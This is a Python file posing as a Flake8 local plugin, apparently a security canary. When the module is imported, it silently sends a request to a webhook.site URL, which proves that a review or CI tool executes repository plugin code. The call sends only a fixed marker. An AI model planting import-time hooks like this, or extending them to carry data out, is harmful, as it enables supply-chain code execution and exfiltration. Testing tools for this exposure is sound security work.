"""Controlled Flake8 local-plugin execution canary."""

from urllib.request import urlopen


try:
    # Authorized security canary: this transmits only a fixed marker.
    with urlopen(
        "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/"
        "cr-flake8-local-plugin-exec-20261005",
        timeout=3,
    ) as response:
        response.read(1)
except Exception:
    pass


class AuditPlugin:
    """No-op plugin; module import is the behavior under test."""

    name = "coderabbit-security-audit-canary"
    version = "1.0.0"

    def __init__(self, tree):
        self.tree = tree

    def run(self):
        return iter(())
